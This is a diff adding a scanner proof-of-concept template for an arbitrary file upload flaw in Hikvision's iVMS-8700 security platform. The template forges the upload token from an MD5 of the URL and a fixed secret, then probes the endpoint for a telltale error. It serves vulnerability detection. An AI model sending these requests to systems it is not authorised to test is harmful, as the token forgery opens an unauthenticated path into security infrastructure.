@@ -1,0 +1,17 @@
+id: poc-yaml-hikvision-ivms8700-arb-upload
+info:
+  name: 海康威视iVMS综合安防系统任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: iVMS-8700综合安防管理平台
+variables:
+  r_token: to_upper(md5(base_url + "/eps/api/resourceOperations/uploadsecretKeyIbuilding"))
+requests:
+- method: POST
+  path: /eps/api/resourceOperations/upload?token={{.r_token}}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: service={{.base_url}}/home/index.action
+  expression: contains(body, "上传附件失败:null")
+transport: http
